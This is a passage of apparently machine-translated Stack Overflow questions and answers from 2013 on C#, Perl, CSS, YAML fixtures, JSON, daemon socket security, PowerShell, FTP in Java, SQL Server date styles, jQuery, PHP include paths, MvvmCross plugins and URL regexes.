这听起来可能很微妙，但事实并非如此。这是一个巨大的区别。

我知道在抽象类中，我们指的是诸如

```
 public abstract void Required(int a, string b); 
```

作为*抽象方法*。我猜这是语义，这里所说的任何内容都不会改变普遍接受的用法，但它们（就像接口定义一样）实际上只是一个规范和对派生自此的类中方法签名的要求抽象类。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-21T18:26:12.393

属性只是两个方法，包作为一个名称。通过在接口中定义一个属性（`Name`例如），您实际上是在定义两个单独的方法（`get_Name`和`set_Name`）。您可以根据需要定义方法（`get`和`set`访问器）。通常您返回或设置字段的值，但这不是强制性的。

您可以通过定义两个单独的方法（例如）在 Java 或 C++ 中执行相同的`getName`操作`setName`。

接口中的属性，可能看起来像[C# 自动实现的属性](http://msdn.microsoft.com/en-us/library/bb384054.aspx)，但它们确实不同。当您定义这样的接口时：

```
interface IPerson
{
    string Name { get; set; }
} 
```

您正在强制接口实现者创建一个名为 的读/写属性`Name`，但是当您在类中执行相同操作时：

```
class Person
{
    public string Name { get; set; }
} 
```

编译器自动创建一个支持字段来保存字符串值，并定义了两个从该字符串字段读取/写入的方法。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-03-21T18:26:51.847

属性只是获取器和设置器，是的（您可以通过使用`monodis`或`ildasm`您的可执行文件来确认这一点，并看到它们只是方法。

所以接口中的属性只是抽象函数。无论您是否有支持领域都没有关系。支持字段（属于该属性的变量）本质上与属性本身无关。

所以不，属性不需要内存，也不是数据，它们的支持字段可能是，但属性本身不是数据。

# perl - 在 Perl 中获取表数据

> ID：15555241
> 
> 赞同：0
> 
> 时间：2013-03-21T18:23:49.037
> 
> 标签：perl

我正在尝试在以下网页中获取大表的内容：[http](http://www.basketball-reference.com/players/j/jamesle01/gamelog/2013/) ://www.basketball-reference.com/players/j/jamesle01/gamelog/2013/ 。然后我想将内容保存到电子表格中。所有这些都将在 Perl 中完成。我不太确定如何进行此操作。任何帮助将不胜感激。

另外，如果您查看大表上方，您可以单击 CSV，我相信（可能？）这将使我更容易获取表格数据并将其放入 Excel 电子表格。对此有何建议？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:29:17.817

如果可以获取 CSV 格式的数据，则可以直接在 Excel 中打开，无需转换。

解析 HTML 很棘手且容易出错，因为构成有效 HTML 的内容可能非常难看。

如果您*确实*需要编写 XLS 文件，则在读取 CSV 后（例如，通过使用[Text::CSV ），您可以使用](http://search.cpan.org/perldoc/Text%3a%3aCSV)[Spreadsheet::WriteExcel](http://search.cpan.org/perldoc/Spreadsheet%3a%3aWriteExcel)之类的东西写入二进制 XLS 文件格式

请注意，我之前使用过[Text::CSV](http://search.cpan.org/perldoc/Text%3a%3aCSV) ——这很合理。我没有使用[WriteExcel](http://search.cpan.org/perldoc/Spreadsheet%3a%3aWriteExcel)的经验。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T19:15:11.147

在本地获得 HTML 文件后，您可以使用[HTML::TableExtract](http://search.cpan.org/perldoc/HTML%3a%3aTableExtract)对其进行解析，并将制表符分隔的文件导入 Excel：

```
#!/usr/bin/env perl

use utf8;
use v5.12;
use strict;
use warnings;
use warnings qw(FATAL utf8);
use open qw(:std :utf8);

# see http://www.perl.com/pub/2012/04/perlunicook-standard-preamble.html

use File::Slurp qw( read_file );
use HTML::TableExtract;

my $content = read_file 'index.html', binmode => ':utf8';

my $te = HTML::TableExtract->new(attribs => {id => 'pgl_basic'});

$te->parse($content);
my ($table) = $te->tables;

for my $row ($table->rows) {
    next if $row->[0] eq 'Rk';
    print join("\t", map { defined($_) ? $_ : '' } @$row), "\n";
} 
```

# css - 我在 CSS 属性中看到“xx”

> ID：15555246
> 
> 赞同：0
> 
> 时间：2013-03-21T18:24:13.050
> 
> 标签：css

我在整个在线代码示例中看到 CSS 属性（xxposition、xxoverflow、xx-min-height）前面的“xx”，但它是什么？评论属性的一种懒惰方式？求知欲求知...

例子：

```
.content { 
border-bottom:solid 1px #ccc; 
xxposition:absolute; 
xxoverflow:hidden; 
xxmin-height:500px;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T18:29:42.770

对，就是这样。这是注释掉规则或属性的短期解决方案。

通过更改标识符，它将错过它最初定位的类或 id。通过将样式或值更改为不存在的关键字，它将成为无效样式，浏览器将忽略它。

我自己使用这种技术，但仅用于在我试验时停用样式，我尽量不在代码中留下任何东西。

# java - 实体没有从夹具数据中获得负载

> ID：15555248
> 
> 赞同：0
> 
> 时间：2013-03-21T18:24:20.217
> 
> 标签：java, playframework, yaml, playframework-1.x, fixtures

以下 YAML 代码有什么问题？所有实体都加载到数据库中，除了 PinBoard，它是一种中间实体 Board 和 Pin。我在那里做错了什么？

```
Board(board1):
    name: Board1
    urlFormattedName: travel
Pin(pin1):
    name: Pin1
    catId: 12345
Pin(pin2):
    name: Pin2
    catId: 23456    
PinBoard:
    board: board1
    pin: pin1 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T10:26:28.827

```
PinBoard(pinBoard1):
    board: board1
    pin: pin1 
```

还要检查是否**必须**设置`not null`模态的属性

 *** * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T00:08:57.907

每当您关联对象时，您都需要使用 [ ] 所以它应该是：

```
PinBoard:
board: [board1]
pin: [pin1] 
```**

# json - JSON.parse：预期的双引号属性名称（var json = JSON.parse(xhr.responseText);）

> ID：15555249
> 
> 赞同：3
> 
> 时间：2013-03-21T18:24:22.837
> 
> 标签：json, three.js

[https://www.dropbox.com/s/h59v7elqn05t7lc/bag.js](https://www.dropbox.com/s/h59v7elqn05t7lc/bag.js)

以下代码给出了 json 文件的链接

```
SyntaxError: JSON.parse: expected double-quoted property name 
```

**Javascript：**

```
var init = function () {
    var canv = document.getElementsByTagName("canvas")[0];
    var w = canv.clientWidth;
    var h = canv.clientHeight;

    var renderer = new THREE.WebGLRenderer({
        canvas: canv
    });
    renderer.setSize(w, h);

    var scene = new THREE.Scene();

    var camera = new THREE.PerspectiveCamera(
        15, // Field of view
    w / h, // Aspect ratio
    0.1, // Near
    10000 // Far
    );
    camera.position.set(-1, 1, 15);
    scene.add(camera);

    var light = new THREE.PointLight(0xFFFFDD);
    light.position.set(-15, 10, 15);
    scene.add(light);

    var ambient = new THREE.AmbientLight(0x999999);
    scene.add(ambient);

    var loader = new THREE.JSONLoader();
    var onGeometry = function (geom) {
        var mesh = new THREE.Mesh(geom, new THREE.MeshFaceMaterial());
        scene.add(mesh);
    };
    loader.load("vwbug.js", onGeometry);

    var render = function () {
        renderer.render(scene, camera);
    };

    setInterval(render, 10);
};

window.onload = init;
window.onresize = init; 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-03-21T20:41:57.033

我认为这是由第 8 行的额外逗号引起的。

```
"materials": [ { 
    "DbgColor" : 15658734, 
    "DbgIndex" : 0, 
    "DbgName" : "dummy", 
    "colorDiffuse" : [ 1, 0, 0 ], 
} ], 
```

发现类似验证器的问题可能会有所帮助，例如[http://jsonlint.com](http://jsonlint.com)。

# c++ - 创建读取面向 Internet 的套接字的守护程序存在哪些安全问题？

> ID：15555271
> 
> 赞同：1
> 
> 时间：2013-03-21T18:25:21.800
> 
> 标签：c++, c, security, sockets, daemon

我有一个使用 Pushover 与我通信的个人服务器。也就是说，我的服务器可以触发一个脚本，以不同的优先级将消息直接发送到我的手机。然而，这是一种方式。我希望通过使用 Pushover 添加 html 链接的能力来解决这个问题。

我非常了解套接字代码，但我对其中涉及的安全性有些模糊。这将如何工作的一个例子是电源熄灭。我的服务器在 UPS 上，因此立即在我的手机上向我发送一条消息，说电源已中断，我是否要关闭系统？（可能会在电源恢复时发送后续消息，这意味着我可能不希望它关闭。）它将包含一个链接，例如 example.com:4000/insert_a_generated_hash_here。如果我决定我确实希望服务器关闭，则监视端口 4000 的守护进程将收到

```
GET /insert_a_generated_hash_here HTTP/1.1\r\n
host: www.example.com\r\n
\r\n 
```

我担心的第一件事是非空终止字符串。这是多大的问题？recv 会自动 null 终止吗？

无论如何，我使用 http get 并对其进行散列（或者我不应该——散列一个潜在的敌对字符串有多安全？）。

如果我使用 MD5，http get 将散列到 25b382b678bb33a21fa677c66e9d02a1（我应该使用 MD5 吗？这只是我想到的第一个散列）。

此时，该哈希（应该可以安全地操作？）与“当前活动”命令表进行比较。由于服务器生成了原始生成的散列，它可以对 http 请求进行散列。如果传入的哈希与表中的某些内容相匹配，那么该命令当然只是运行预先设定的命令。命令也仅在 10 分钟内处于活动状态，此时它们将从活动列表中删除。我还可以添加一个“非活动”列表，它会在我的手机上向我发送一条消息，说“已发出此命令，但未激活”。

在这种情况下，该命令将是关闭，尽管它可能是服务器上的用户通过包管理器等安装某些东西的批准。守护进程也可以为一个简单的网页发回相关的 http 响应。说“好！” （我不认为这有什么大不了的？）

这有多安全，我应该注意什么？或者整个想法是安全自杀的顶峰？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:40:16.060

MD5虽然被广泛使用，但众所周知是被[破坏](http://en.wikipedia.org/wiki/MD5)的。改为查看 SHA-1 或类似的东西。

你永远不应该假设任何空终止（或者它提供了正确的空终止，正如 DavidSchwartz 下面所说）。如果您的应用程序依赖于此，请确保在收到请求后自己在守护程序上执行此操作。这确实很重要；您不希望通过愉快地读取或操作不会终止并且只会浪费您的内存的“字符串”而导致缓冲区溢出。

当您说“表”时，您是指在守护程序中硬编码的查找表还是数据库表？如果这些事情发生在内存中，你应该没问题，因为它们不是“可执行的”。例如，如果您正在使用数据库，恶意用户可能会制作一个攻击字符串，以某种方式利用您的数据库（暴露所有包含的数据或获得对系统的未经授权的访问）。散列恶意字符串应该没有效果，但是，如果您没有向散列添加任何盐，则恶意用户可能会自己散列他的字符串并执行命令，如果您允许在您的系统上直接执行命令（抱歉，我不确定您是否已全面了解您的系统）。

无论如何，从安全角度来看，您的策略（只要可行且可维护）都是好的。明确列举可以运行的确切内容可以让您更全面地控制系统的运行方式。这是用户输入卫生的一种形式；您接受原始用户请求并将其翻译（如果无效则不翻译）以在您的系统中正常工作。也就是说，如果这些请求中的任何一个使用原始用户输入，您可能需要进行进一步检查。也就是说，如果请求不是简单地翻译（即您收到`shutdown <message>`），那么在简单地执行它之前进行清理是很重要的`<message>`（它可能是恶意代码）。如果不是这种情况（即您只是收到`shutdown`并执行正确的操作），那么我不会担心。

至于发送网络响应，这可能没问题。如果响应是硬编码的（而不是从动态源中获取的），我不会太担心这个。硬编码响应将是安全的，因为它不会尝试从磁盘读取任何其他内容，并且无法利用此发送（假设没有缓冲区溢出等）。

我能想到的另一个攻击向量是如果没有身份验证。如果这是一个开放式服务器，您可能希望以某种方式将其锁定以进行某种准入控制。这将防止恶意用户以未经授权的方式在您的服务器上执行完全有效的命令。

**编辑**

为了更加保护 Web 界面，我建议甚至只使用一个简单的用户身份验证表单。简单地依赖散列遵循[通过隐蔽](http://en.wikipedia.org/wiki/Security_through_obscurity)原则的安全性，这不应该被依赖。请注意，此表单存在与之前讨论过的相同的用户输入问题（输入卫生、缓冲区溢出等）。`sha1(user:pass)`以某种编码方式（即）直接对用户输入进行散列并将此散列与必须存储在某处的有效登录散列列表进行比较可能是最简单的。这有助于用户输入卫生，因为这`sha1(malicious_payload)`将是一个简单的哈希。也就是说，这仍然不能防止您必须积极检查的缓冲区溢出。通常，使用指定长度的命令版本，例如`strncpy`or`strncmp`而不是`strcpy`and`strcmp`. 最后，如果您的密码以某种方式泄露，此表单可能仍会遭受社会工程攻击（即密码网络钓鱼）和密码窃取。也就是说，这些不是系统故障，而是安全的人为因素。

# powershell-2.0 - Powershell 脚本未运行

> ID：15555272
> 
> 赞同：9
> 
> 时间：2013-03-21T18:25:21.663
> 
> 标签：powershell-2.0

当我启动 powershell 时，我收到以下消息并且无法运行 powershell 脚本。

```
2013-03-21 14:21:19 [000002fc] info    [native] No Registry-Settings exist for this process
2013-03-21 14:21:19 [000002fc] info    [native] Agent has no active settings - running normally
Windows PowerShell 
```

这不会发生在我有 powershell 的另一台机器上。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-05T19:02:20.610

最后，我们认为是 Dynatrace 代理挂在了 powershell 进程中导致了该信息/警告。禁用 Dynatrace 服务，重新启动服务器。没有更多的错误。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-05-03T22:15:45.577

迟到的回复，但不是禁用 .net 代理，您可以通过添加此 env var 来抑制初始控制台日志记录：

```
DT_DISABLEINITIALLOGGING=true 
```

# java - 如何通过 FTP java 代码下载文件

> ID：15555274
> 
> 赞同：-2
> 
> 时间：2013-03-21T18:25:27.210
> 
> 标签：java, ftp, client, inputstream

需要使用 FTP 从服务器下载文件，而不使用现有库和 3rd parity 解决方案。我设法连接并登录到服务器，传输类型模式（ASCII）和被动模式，所以我得到了端口号并打开了新的 ServerSocket（端口）。但是当我调用 RETR 文件名时，我的程序在 InputStream.readLine() 上阻塞（在读取服务器端口时，意味着服务器没有响应）在调用 RETR 命令之前有什么我忘了做的吗？

```
//PASV
outputStream.println("pasv");    

//227 Entering Passive Mode(a1,a2,a3,a4,p1,p2)
String response = inputStream.readLine();   

// port = p1*256 + p2
ServerSocket serverSocket = new ServerSocket(port);

//RETR fileName 
outputStream.println("retr "+ fileName);

//server no answer
String reply = inputStream.readLine() 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-16T18:47:08.533

FTP PASV 命令不会在客户端打开套接字，IP 和端口从服务器返回给客户端，基本上告诉客户端“Ok connect to me on this IP and port”。请查看 RFC 959 以了解实施细节。用 JAVA 实现 FTP 客户端并不是一个简单的过程。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-16T08:24:58.753

```
 public void download(String remoteFile) {

    FTPClient ftpClient = new FTPClient();

    try {
        ftpClient.connect(server, 22);
        ftpClient.login(ftpUser, ftpPassword);
        ftpClient.enterLocalPassiveMode();
        ftpClient.setFileType(FTP.BINARY_FILE_TYPE);

        // APPROACH #1: using retrieveFile(String, OutputStream)
        File downloadFile1 = new File("D:/ftpdosyam.txt");
        OutputStream outputStream = new BufferedOutputStream(
                new FileOutputStream(downloadFile1));
        boolean success = ftpClient.retrieveFile(remoteFile, outputStream);
        outputStream.close();

        if (success) {
            System.out.println("File #1 has been downloaded successfully.");
        }
    } catch (SocketException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    } catch (FileNotFoundException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    } catch (IOException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }
} 
```

# sql-server - 未记录的 CONVERT 样式 - datetime 23

> ID：15555275
> 
> 赞同：5
> 
> 时间：2013-03-21T18:25:34.287
> 
> 标签：sql-server, tsql, datetime, sql-server-2008-r2, string-formatting

最近我偶然发现了`CONVERT`函数样式 23，它非常方便，因为它以格式为您提供 DATE `yyyy-mm-dd`。问题是它没有记录在 msdn 中！（来自 SSMS 帮助后的 F1 转换链接：http: [//msdn.microsoft.com/en-us/library/ms187928%28SQL.105%29.aspx](http://msdn.microsoft.com/en-us/library/ms187928%28SQL.105%29.aspx)）。例子：

```
select convert( date ,'2012-01-30', 23)
select convert(varchar(255), getdate(), 23) 
```

这种风格非常有用，我一直在想念它，但我担心的是： - 使用安全吗？它是否被错误地弃用或潜入并且可能在未来的版本/更新中被删除？- 有人知道其他隐藏样式吗？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-03-21T18:30:06.510

主要基于[这篇文章](https://www.mssqltips.com/sqlservertip/4052/build-a-cheat-sheet-for-sql-server-date-and-time-formats/?utm_source=AaronBertrand)，文档中还缺少很多其他内容（自 2005 年以来可能已经引入了更多内容，自从我尝试探索以来已经有一段时间了）：

```
--DROP TABLE dbo.DateTimeStyles;
CREATE TABLE dbo.DateTimeStyles
(  
    styleID TINYINT PRIMARY KEY,  
    outputLength TINYINT, 
    outputSyntax AS (CONVERT(VARCHAR(255), 'CONVERT(CHAR(' 
        + RTRIM(outputLength) + '), CURRENT_TIMESTAMP, ' 
        + RTRIM(styleID) + ')')), 
    outputSample VARCHAR(255)
); 

INSERT dbo.DateTimeStyles(styleID, outputLength) 
VALUES (0,   19 ), (1,   8  ), (2,   8  ), (3,   8  ),
       (4,   8  ), (5,   8  ), (6,   9  ), (7,   10 ),
       (8,   8  ), (9,   26 ), (10,  8  ), (11,  8  ),
       (12,  6  ), (13,  24 ), (14,  12 ), (20,  19 ), 
       (21,  23 ), (22,  20 ), (23,  10 ), (24,  8  ),
       (25,  23 ), (100, 19 ), (101, 10 ), (102, 10 ),  
       (103, 10 ), (104, 10 ), (105, 10 ), (106, 11 ),  
       (107, 12 ), (108, 8  ), (109, 26 ), (110, 10 ),  
       (111, 10 ), (112, 8  ), (113, 24 ), (114, 12 ),  
       (120, 19 ), (121, 23 ), (126, 23 ), (127, 23 ),
       (130, 32 ), (131, 25 );

DECLARE @sql NVARCHAR(MAX) = N'';

SELECT @sql += N'UPDATE dbo.DateTimeStyles 
        SET outputSample = ' + outputSyntax + ' 
        WHERE styleID = ' + RTRIM(StyleID) + ';'
    FROM dbo.DateTimeStyles; 

EXEC sp_executesql @sql;

SELECT styleID, outputSyntax, outputSample
  FROM dbo.DateTimeStyles
  ORDER BY styleID; 
```

当然，与许多未记录的东西一样，使用“秘密”的东西需要您自担风险。您应该标记您使用它们的模块，以便您可以在升级之前对其进行测试 - 它们不会是升级顾问、最佳实践分析器、弃用跟踪事件、扩展事件等将接收并告诉您的事情，因为微软可以自行决定删除任何未记录的功能/语法（尽管我发现他们极不可能删除任何这些，即使他们对记录它们不感兴趣）。如果您有一个部署服务包/升级的测试服务器，在任何此类升级后运行此代码将告诉您此处使用的任何样式是否已被删除。因此，您可能希望将此代码保存在某处，并且只包含您积极使用的未记录样式编号。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-21T20:20:08.483

至于风格 23 的具体情况......我建议不要使用它，因为有这样一个简单的文档替代方案：

```
SELECT CONVERT(CHAR(10),GETDATE(),120) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-08-27T08:59:50.553

**根据“CAST and CONVERT”**文章的旧²和新³版本，**包括 99 及以下的几种样式是不确定的。**至少有些人会认为这是不安全的。

 ****我也同意 Aaron 的观点，即未记录的东西*可能*意味着他们不希望人们知道或使用它，因此在某些时候任意删除/缺陷对我们来说并不奇怪。

关于转换不确定性，引用[**较新的文章版本**](https://docs.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql)，在“*某些日期时间转换是不确定的*”下：

> 下~~表~~[list] 列出了字符串到日期时间的转换不确定的样式。
> 
> *   100以下的所有款式¹
> *   106
> *   107,
> *   109,
> *   113,
> *   130.
> 
> ¹样式 20 和 21 除外

同样来自同一篇文章，在“*日期和时间样式*”下，这个不太明显的引用似乎重复了相同的列表，增加了 100：

> ¹这些样式值返回不确定的结果。包括所有 (yy)（无世纪）样式和 (yyyy)（有世纪）样式的子集。

[(2) 已经有问题的链接。]
[(3) 2017 年 8 月 27 日。]****

# javascript - document.write() 内联工作，但不使用 jQuery 的 .html()

> ID：15555277
> 
> 赞同：2
> 
> 时间：2013-03-21T18:25:44.243
> 
> 标签：javascript, jquery, document.write

如果`document.write`页面加载时我的 dom 中已经有一个，它只会在调用它的地方写入。例如：

```
<div id="d1">
existing text <script>document.write('& doc written text');</script>
</div>
<div>footer</div> 
```

将呈现为`<div id="d1">existing text & doc written text</div><div>footer</div>`

但是，如果我要使用 jQuery 来更新 div 中的 html，比如

```
$("#d1").html("another approach <script>document.write('wipes out the screen');</script>"); 
```

我最终只是简单地使用`wipes out the screen`b/c 它基本上摆脱了文档中的所有内容，而不是只编写内联脚本所在的位置。我怎样才能`.html()`使用包含 的值`document.write()`，但让它的行为与它在 dom 中开始时的行为相同（参见第一个示例）。谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T18:29:20.707

如果页面已完全写入，则不能使用 document.write()。您无法改变它的行为方式。你需要重新考虑你在做什么。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-21T18:31:17.357

该`html()`函数**替换**元素的内容。[（见 API）](http://api.jquery.com/html/#html2)

你想要的是[`append()`](http://api.jquery.com/append/).

# php - 使用 PHP for CSS 的共享服务器和本地服务器的绝对路径

> ID：15555278
> 
> 赞同：1
> 
> 时间：2013-03-21T18:25:52.607
> 
> 标签：php, html, css, relative-path, absolute-path

我已经搜索了可以在多个项目中使用的一站式解决方案，但我还没有找到任何可以工作的东西。

因此，当我构建站点时，我使用 PHP 包含在整个站点中使用的站点的页眉、导航和页脚。

所以对于一个包含页眉、导航、正文和页脚的模板文件，我这样做：

```
<?php include 'views/headerHTML.php'; ?>

<?php include 'views/headerNav.php'; ?>

<div id="main">

<!--content-->

</div><!--main-->

<?php include 'views/footer.php'; ?> 
```

现在我的 CSS 调用行与任何 JS 或跟踪片段一起位于 headerHTML 中。

如果网页位于多个文件夹中 - 那么包含必须相对于根文件进行更改

```
<?php include '../../views/headerHTML.php; ?> 
```

但是其中包含的 CSS 和 JS 引用会变得不正确，因为它是相对于 ROOT 编写的

```
<link type="text/css" rel="stylesheet" href="css/test.css" /> 
```

我在本地使用 WAMP，我所有的项目都基于与多个提供商（GD、fatcow 等）共享的虚拟服务器，并且它们都有自己古怪的根引用等。

我尝试使用解决方案，例如

```
$_SERVER['DOCUMENT_ROOT']
define('ROOT', dirname(__FILE__)); 
```

但我似乎无法让他们在我的本地服务器和他们的虚拟服务器上工作。我想要的是，无论我的网页在文件夹层次结构中有多深 - 页眉、导航、页脚中的引用代码片段或位于其各自文件夹中的实用程序将被正确调用。

我一直在做的是设置特定的包含，其中的引用已更改为这样：

```
<?php include '../../views/headerHTML_DoubleFolder.php; ?> 
```

这适用于深度为两个文件夹的页面。

我 100% 确定这可能是我能做的最糟糕的事情，并且首先否定了做包括的目的

有人愚弄我，请教我一些新东西=D！

我很感激。

编辑 - - - - - - - -

问题示例 =

localhost/site/login/login.php 调用：

```
<?php include '../views/headerHTML.php'; ?> 
```

在该 headerHTML.php 文件中有：

```
<link type="text/css" rel="stylesheet" href="css/style_v0313.css" /> 
```

正如您所看到的，当 login.php 通过 headerHTML 调用它时，css 位置将不正确

访问 login.php 时，将 / 或 ./ 或 dirname( **FILE** ) 添加到 css href 仍然不会加载样式表

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T18:52:47.283

您可以使用路径，例如 /css/style.css。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-21T18:53:50.530

尝试使用“./addresshere”。

示例域：**www.test.com**
假设您的网站位于以下文件夹中：**www.test.com/portal**
，而您的 css 位于：**www.test.com/portal/css**

CSS 调用示例：

```
<link type="text/css" rel="stylesheet" href="./portal/css/test.css" /> 
```

**./**让您通过根（主）目录。在 localhost 上，**./**为您提供**localhost**地址

# plugins - MvvmCross vnext - 插件问题

> ID：15555279
> 
> 赞同：1
> 
> 时间：2013-03-21T18:25:57.180
> 
> 标签：plugins, xamarin.ios, mvvmcross

我已经使用 MvvmCross v1 有一段时间了，我发现它真的很有用而且不太难使用！所以我硬着头皮决定在我们的下一个项目中使用 vnext。在我尝试使用插件之前一切都很好，它崩溃并显示以下输出 -

```
2013-03-21 18:14:27.121 MyApp[85942:11903] mvx: Diagnostic:   0,00 Setup: Text serialization start
2013-03-21 18:14:27.124 MyApp[85942:11903] mvx: Diagnostic:   0,03 Setup: PlatformServices start
2013-03-21 18:14:27.125 MyApp[85942:11903] mvx: Diagnostic:   0,03 Setup: ViewModelFramework start
2013-03-21 18:14:27.126 MyApp[85942:11903] mvx: Diagnostic:   0,03 Setup: PluginManagerFramework start
2013-03-21 18:14:27.127 MyApp[85942:11903] mvx: Diagnostic:   0,03 Setup: App start

Unhandled Exception:
0   MyApp                      0x00079b12 mono_handle_exception_internal_first_pass + 3058
1   MyApp                      0x0007b1e2 mono_handle_exception_internal + 1602
2   MyApp                      0x0007bd2f mono_handle_exception + 47
3   MyApp                      0x000bce22 mono_x86_throw_exception + 306
4   ???                                 0x07986f8f 0x0 + 127430543
at Cirrious.MvvmCross.Plugins.MvxBasePluginManager.ExceptionWrappedLoadPlugin (System.Type) <IL 0x00002, 0x0001f>
at Cirrious.MvvmCross.Plugins.MvxBasePluginManager.EnsureLoaded<T> () <IL 0x00030, 0x0008c>
at Cirrious.MvvmCross.Plugins.Share.PluginLoader.EnsureLoaded () <IL 0x00008, 0x00029>
at MyApp.Core.BaseApp.InitialisePlugins () [0x00000] in /Users/franklyn/Documents/Programming/MyApp/MyApp.Core/App.cs:42 
```

每当我尝试加载具有“Touch”项目元素的插件时，都会发生这种情况，而其他插件（例如没有的 JsonLocalisation 插件）加载正常。

如果其他人遇到此问题并知道解决方法，我会很高兴收到他们的来信。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T20:12:06.710

对于 Android，插件被加载只是因为它们在那里——它们是文件并且可以通过`Assembly.Load`

对于 iOS，由于 Ahead-Of-Time 编译要求，无法以这种方式加载插件。

为了解决这个问题，iOS 中的所有平台特定插件都必须在设置期间进行注册。

`AddPluginLoaders`您可以在`Setup`所有示例中看到此代码- 请参阅[https://github.com/slodge/MvvmCross/blob/vnext/Sample%20-%20TwitterSearch/TwitterSearch.UI.Touch/Setup.cs](https://github.com/slodge/MvvmCross/blob/vnext/Sample%20-%20TwitterSearch/TwitterSearch.UI.Touch/Setup.cs)

```
protected override void AddPluginsLoaders(MvxLoaderPluginRegistry registry)
{
    registry.AddConventionalPlugin<Cirrious.MvvmCross.Plugins.Visibility.Touch.Plugin>();
    registry.AddConventionalPlugin<Cirrious.MvvmCross.Plugins.File.Touch.Plugin>();
    registry.AddConventionalPlugin<Cirrious.MvvmCross.Plugins.DownloadCache.Touch.Plugin>();
    base.AddPluginsLoaders(registry);
} 
```

* * *

总的来说，插件机制比旧`v1`代码要好得多，因为这意味着你的应用程序中包含的不需要的代码更少，而且它是可扩展的。

* * *

有关为什么`Assembly.Load`不能在 iOS 中使用的最近讨论，请参阅[http://forums.xamarin.com/discussion/comment/7882](http://forums.xamarin.com/discussion/comment/7882) - 我已尝试避免此步骤。

# javascript - 获取文本区域中的所有 URL

> ID：15555293
> 
> 赞同：-1
> 
> 时间：2013-03-21T18:26:36.357
> 
> 标签：javascript, regex

简单的问题。给定一个文本区域，其中可能复制和粘贴了一些 url，我想将它们全部解析到一个数组中。不想替换内容，而是使用 Javascript 将文本区域中的所有 url 放入一个数组中。

**编辑**

[http://jsfiddle.net/sujesharukil/hyEem/19/](http://jsfiddle.net/sujesharukil/hyEem/19/)

创造了一个小提琴。我大部分时间都在工作。唯一的问题是，它不获取查询字符串参数。可能这应该是问题所在。

这是我放在文本区域的

www.google.com ssdfsdfasdfasdf [http://someplace.com?x=sdfsdf](http://someplace.com?x=sdfsdf)

```
regex = new RegExp(/[-a-zA-Z0-9@:%_\+.~#?&//=]{2,256}\.[a-z]{2,4}\b(\/[-a-zA-Z0-9@:%_\+.~#?&//=]*)?/gi); 
```

返回两项，但没有第二项的查询字符串参数。

帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T18:32:45.460

假设它们将由换行符分隔，您可以这样做：

```
var array = document.getElementById('yourTextAreasID').value.split('\n'); 
```

或者，如果 URL 不是 textarea 中的唯一内容，则必须使用正则表达式。像这样的东西：

```
var array = document.getElementById('yourTextAreasID').value.split(/[-a-zA-Z0-9@:%_\+.~#?&//=]{2,256}\.[a-z]{2,4}([\/-a-zA-Z0-9@:%_\+.~#\?&//=]*)*/gi); 
```

这是一个很好的正则表达式，用于查找多种格式的 URL。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-21T18:37:21.070

用于在文本区域中查找 url 的正则表达式：`((?:https?:|www\.)[^\s]+)`
在此处解释演示：[http ://regex101.com/r/vZ0aE9](http://regex101.com/r/vZ0aE9)

# javascript - 如何禁用 DIV 元素和里面的一切

> ID：15555295
> 
> 赞同：176
> 
> 时间：2013-03-21T18:26:47.993
> 
> 标签：javascript, jquery, html, css

我需要使用 Javascript 禁用 DIV 及其所有内容。我可以发誓做一个简单的

```
<div disabled="true"> 
```

以前为我工作，但由于某种原因它不再有效。我不明白为什么。

在 IE10 中：文本“单击我”未显示为灰色，单击处理程序仍然有效。

我实际上需要这个为 IE10 工作。下面是我的代码。

```
<html>
    <script>
         function disableTest(){

            document.getElementById("test").disabled = true;
            var nodes = document.getElementById("test").getElementsByTagName('*');
            for(var i = 0; i < nodes.length; i++){
                nodes[i].disabled = true;
            }

         }

     </script>

<body onload="disableTest();">
   <div id="test">
       <div onclick="alert('hello');">
           Click Me
       </div>
   </div>

</body>
</html> 
```

* * *

## 回答 #1

> 赞同：403
> 
> 时间：2013-03-21T19:23:23.317

以下 css 语句禁用点击事件

```
pointer-events:none; 
```

* * *

## 回答 #2

> 赞同：64
> 
> 时间：2013-03-21T18:33:29.163

试试这个！

```
$("#test *").attr("disabled", "disabled").off('click'); 
```

我没有看到您在上面使用 jquery，但您已将其列为标签。

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2013-07-22T14:39:07.363

纯 javascript 没有 jQuery

```
function sah() {
		$("#div2").attr("disabled", "disabled").off('click');
		var x1=$("#div2").hasClass("disabledDiv");

		(x1==true)?$("#div2").removeClass("disabledDiv"):$("#div2").addClass("disabledDiv");
  sah1(document.getElementById("div1"));

}

    function sah1(el) {
        try {
            el.disabled = el.disabled ? false : true;
        } catch (E) {}
        if (el.childNodes && el.childNodes.length > 0) {
            for (var x = 0; x < el.childNodes.length; x++) {
                sah1(el.childNodes[x]);
            }
        }
    }
```

```
#div2{
  padding:5px 10px;
  background-color:#777;
  width:150px;
